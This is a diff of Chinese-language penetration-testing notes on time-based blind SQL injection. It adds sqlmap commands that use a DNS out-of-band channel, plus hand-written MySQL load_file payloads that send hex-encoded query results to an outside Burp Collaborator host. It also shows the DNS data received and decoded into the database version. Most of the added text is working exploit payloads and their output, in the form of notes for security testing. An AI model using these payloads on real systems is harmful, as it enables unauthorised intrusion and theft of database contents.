@@ -391,12 +391,54 @@ windows服务器的web应用存在SQLi 基于时间的盲注 如何快速获取�
 
 原理参考[类型6 - "带外"(out-of-band)](web_vul_sqli.md#类型6---带外out-of-band)
 
+【实际测试】带外获取数据-自动化
 ```
+# 对比这2个方法
 # 基于时间的盲注 - 拿数据方法1: 根据延时来跑数据(很慢)
-python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --tech=T --dbms mssql --dbs
+python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --tech=T --dbms mysql --dbs
 
 # 基于时间的盲注 - 拿数据方法2: 使用带外请求(OOB) 利用DNS exfiltration跑数据(很快)
-# 假设本机的公网ip为114.1.1.1  就在本机运行sqlmap
-python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --dbms=mssql --dbs --dns-domain=YOUR.com
-[16:25:22] [INFO] testing for data retrieval through DNS channel
+# 注意:
+# YOUR.com 的IP为 114.1.1.1  且设置了DNS Host 也就是把所有尝试解析YOUR.com的那些DNS请求 都发送到ns1.YOUR.com的53号UDP端口
+# ns1.YOUR.com 的IP为 114.1.1.1
+# 在这台机器上运行以下sqlmap命令 注意参数--dns-domain 会在53端口开启一个DNS服务作为ns服务器 接收对YOUR.com的DNS请求(得到其中携带的数据)
+python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --dbms mysql --dbs --dns-domain=YOUR.com
+[07:25:21] [INFO] testing for data retrieval through DNS channel
+```
+
+【实际测试】带外获取数据-手动
+
+```
+# 场景:windows服务器的web应用 参数id 存在SQLi 基于时间的盲注
+
+# 手工利用第1步 测试能否收到数据
+# id参数的值为
+1234'+(select load_file('\\\\easv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net\\anq'))+' 
+
+# 实际HTTP请求的第1行 内容如下 其中id参数的值做了编码 JavaScript encodeURIComponent()
+/user.php?id=1234'%2b(select%20load_file('%5c%5c%5c%5ceasv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net%5c%5canq'))%2b' HTTP/1.1
+
+# 测试成功 收到了DNS数据.
+
+
+# 手工利用第2步 获取数据库的数据 如version()
+# id参数的值为
+1234' AND (SELECT 2026 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT LOAD_FILE(CONCAT(0x5c5c5c5c474c762e,(SELECT HEX(MID((IFNULL(version(),0x20)),1,31))),0x2e5471722e656173763572716a7870346a62626b357438766c716e6e3569776f6f63642e62757270636f6c6c61626f7261746f722e6e65745c5c4c6e6f74))),2,1))>563,0,5)))))Uyjo) AND 'Tbug'='Tbug
+
+# 实际HTTP请求的第1行 内容如下 其中id参数的值做了编码 JavaScript encodeURIComponent()
+/user.php?id=1234'%20AND%20(SELECT%202026%20FROM%20(SELECT(SLEEP(5-(IF(ORD(MID((SELECT%20LOAD_FILE(CONCAT(0x5c5c5c5c474c762e%2C(SELECT%20HEX(MID((IFNULL(version()%2C0x20))%2C1%2C31)))%2C0x2e5471722e656173763572716a7870346a62626b357438766c716e6e3569776f6f63642e62757270636f6c6c61626f7261746f722e6e65745c5c4c6e6f74)))%2C2%2C1))%3E563%2C0%2C5)))))Uyjo)%20AND%20'Tbug'%3D'Tbug HTTP/1.1
+
+
+# 收到了DNS数据
+GLv.352E352E3533.Tqr.easv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net.
+
+其中352E352E3533是经过hex编码的数据，做decode即可:
+
+Hex to ASCII
+5.5.53
+
+Hex to UTF-8
+5.5.53
+
+得知了MySQL的版本为5.5.53
 ```
